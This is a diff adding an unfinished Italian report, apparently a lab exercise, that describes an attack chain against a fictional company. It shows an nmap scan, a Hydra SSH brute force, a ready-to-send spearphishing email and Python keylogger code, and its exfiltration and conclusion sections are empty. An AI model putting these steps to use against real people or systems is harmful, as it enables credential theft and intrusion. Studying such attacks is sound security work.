@@ -1,4 +1,158 @@
-# Report
+# La Morsa del Cyber Crimine: Esplorazione di un Attacco Multi-Fase, da Spearphishing a Furto di Dati
+
+## Introduzione 
+
+### Contesto e Importanza della Cybersecurity
+
+Le minacce cyber sono in continua evoluzione e possono avere conseguenze devastanti sulla privacy, sull'integrità dei dati e sulla reputazione delle aziende. Tra le varie tecniche utilizzate dagli attaccanti, gli attacchi di spearphishing, l'iniezione di keylogger, il furto di credenziali e la divulgazione di informazioni sono tra i più pericolosi e diffusi.
+
+### Obiettivo del Report
+
+L'obiettivo di questo report è analizzare dettagliatamente un attacco composto da diverse fasi: enumerazione, spearphishing, iniezione di un keylogger, furto di credenziali e esfiltrazione di informazioni.
+
+### Descrizione dell'attacco
+
+L'attacco analizzato in questo report inizia con la fase di enumerazione, dove l'attaccante raccoglie informazioni su un'azienda e i suoi dipendenti. Successivamente, viene lanciato un attacco di spearphishing mirato, seguito dall'iniezione di un keylogger nel sistema della vittima. Il keylogger permette all'attaccante di rubare le credenziali di accesso (e qualsiasi cosa la il bersaglio digiti), che vengono poi utilizzate per accedere a informazioni sensibili ed esfiltrarle, con potenziali impatti devastanti per l'azienda colpita.
+
+## Fase 0: Enumeration
+
+L'enumerazione è una fase preliminare degli attacchi informatici in cui l'attaccante raccoglie informazioni dettagliate sulla vittima.
+
+### Tecniche di Enumerazione
+
+Gli attaccanti utilizzano diverse tecniche per raccogliere informazioni durante la fase di enumerazione, tra cui l'utilizzo di strumenti automatizzati come Nmap:
+
++ Social Media: Monitoraggio dei profili social dei dipendenti per raccogliere informazioni personali e professionali che possono essere utilizzate per creare attacchi mirati.
+
++ LinkedIn: Utilizzo di LinkedIn per identificare i dipendenti chiave dell'azienda e ottenere informazioni sui loro ruoli e interessi professionali.
+
++ Whois Lookup: Utilizzo di servizi Whois per ottenere informazioni sui registranti di domini aziendali, che possono includere nomi, indirizzi e contatti.
+
++ Nmap: Nmap è uno strumento di scansione di rete ampiamente utilizzato per raccogliere informazioni su dispositivi e servizi in una rete. Può essere utilizzato per identificare host attivi, porte aperte e servizi in esecuzione su tali porte.
+
+### Scoperte nella fase di enumerazione
+
+Dopo aver identificato l'azienda "Finanza Viva" **e il dipendente Alessandro, noto per il suo interesse nella finanza e negli investimenti, ** l'attaccante procede con la scansione della rete utilizzando Nmap. Supponiamo che l'attaccante trovi l'indirizzo IP 10.0.2.4 associato all'azienda.
+
+Utilizzando Nmap:
+
+```shell
+nmap -sV 10.0.2.4
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 08:59 EDT
+Nmap scan report for 10.0.2.4
+Host is up (0.0019s latency).
+Not shown: 995 closed tcp ports (conn-refused)
+PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+Service Info: Host: DESKTOP-004APQ9; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+```
+
+L'output rivela che l'azienda "Finanza Viva" ha configurato una macchina windows in cui il servizio SSH e il servizio SMB sono attivi.
+
+## Fase 1: Valid Account
+
+L'attaccante procede con l'utilizzo di Hydra per effettuare un attacco di forza bruta e ottenere accesso ai sistemi. l'attaccante usa un dizionario di nomi utenti e di password per trovare le credenziali del servizio SSH.
+
+```shell
+hydra -L User -P Password 10.0.2.4 ssh
+[DATA] attacking ssh://10.0.2.4:22/
+[22][ssh] host: 10.0.2.4   login: Amministratore   password: Password
+[22][ssh] host: 10.0.2.4   login: amministratore   password: Password
+1 of 1 target successfully completed, 2 valid passwords found
+```
+L'attaccante scopre l'uso di credenziali predefinite da parte dell'amministratore. Poi procede con l'accesso a SSH.
+
+```shell
+ssh Amministratore@10.0.2.4  
+Amministratore@10.0.2.4's password: 
+Microsoft Windows [Versione 10.0.19045.2965]
+(c) Microsoft Corporation. Tutti i diritti sono riservati.
+                                                          
+amministratore@DESKTOP-004APQ9 C:\Users\filip> 
+```
+L'attaccante ottiene una shell nell'dispositivo dell'azienda con l'identità dell'amministratore.
+Navigando nella directory Users, l'attaccante scopre la presenza di un altro utente: Alessandro.
+
+Navigando nei file dell'utente, l'attaccante scopre che Alessandro è un grande fan della finanza e all'interno della azienza è il responsabile della gestione dei conti bancari e ne trova i contatti.
+
+## Fase 2: Spearphishing e Iniezione di un Keylogger
+L'attaccante utilizza le informazioni raccolte su Alessandro, un dipendente di "Finanza Viva" noto per il suo interesse nella finanza e negli investimenti, per creare un'email altamente personalizzata. L'email finge di provenire da una rinomata azienda del settore finanziario che propone di testare in esclusiva una nuova applicazione di gestione della spesa. L'attaccante ha scoperto l'indirizzo email di Alessandro e decide di inviare il seguente messaggio:
+> Da: staff@Gestoredispesa.com
+
+>A: Alessandro@finanzaviva.com
+
+>Oggetto: Partecipazione Esclusiva al Test del Nuovo Software di Gestione delle Spese
+
+>Ciao Alessandro,
+
+>Spero che tu stia bene! Sono entusiasta di annunciarti che sei stato scelto per partecipare in esclusiva al test del nostro nuovo software per la Gestione Personale delle Spese.
+
+>Abbiamo notato il tuo interesse e la tua competenza nel campo e crediamo che il tuo feedback possa essere estremamente prezioso per noi mentre continuiamo a perfezionare e migliorare il nostro prodotto.
+
+>Il nostro team ha fatto un duro lavoro per sviluppare uno strumento intuitivo e potente che semplifichi la gestione delle spese personali, offrendo funzionalità avanzate e una user experience impeccabile.
+
+>Vorremmo invitarti a provare il software in anteprima e condividere con noi le tue opinioni, suggerimenti e eventuali problemi che potresti riscontrare durante l'utilizzo. Il tuo contributo sarà fondamentale per aiutarci a rendere il software il migliore possibile prima del lancio ufficiale.
+
+>Ti inviamo il link al software e le istruzioni per iniziare il test. Se hai domande o hai bisogno di assistenza, non esitare a contattarci. Non vediamo l'ora di lavorare con te e di rendere questo software un successo insieme!
+
+>Cordiali saluti,
+
+>Il Team di Gestione delle Spese
+
+In allegato all'email, c'è un file eseguibile chiamato "Gestore_di_spesa.exe".
+
+### Funzionamento del Software Malevolo
+
+Alessandro scarica e avvia il programma "Gestore_di_spesa.exe". Il programma si presenta come una legittima applicazione di gestione delle spese, consentendo all'utente di inserire e monitorare entrate e uscite. Tuttavia, al momento della chiusura dell'applicazione, il keylogger nascosto si attiva.
+
+```python
+# Definisci la directory e il nome del file di log
+log_directory = r"C:\Users\Alessandro"
+log_file_name = "log.txt"
+log_file_path = os.path.join(log_directory, log_file_name)
+# Funzione per loggare le chiavi premute
+def on_press(key):
+    try:
+        print(f"Premuto: {key.char}")
+        with open(log_file_path, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        print(f"Premuto: {key}")
+        with open(log_file_path, "a") as f:
+            f.write(f"{key}\n")
+
+# Funzione per loggare le chiavi rilasciate
+def on_release(key):
+    print(f"Rilasciato: {key}")
+
+# Avvia il keylogger
+with Listener(on_press=on_press) as listener:
+    listener.join()
+```
+Questo codice rappresenta un esempio di un keylogger scritto in Python, che registra tutti i tasti premuti e li salva in un file log.txt nella cartella dell'utente.
+
+### Raccolta dei Dati
+
+Dopo aver chiuso il programma, il keylogger inizia a catturare tutte le informazioni digitate da Alessandro, inclusi:
+
++ Nomi utente e password per l'accesso ai sistemi aziendali.
++ Dati personali e finanziari inseriti nei siti web.
++ Comunicazioni via email e chat.
+
+## Fase 3: Esfiltrazione delle file log.txt
+
+
+
+## Fase 5: 
+
+## Fase 7: Conclusioni
+
+## Fase 8: Riferimenti
 
 ## Create, Share and Collaborate
 
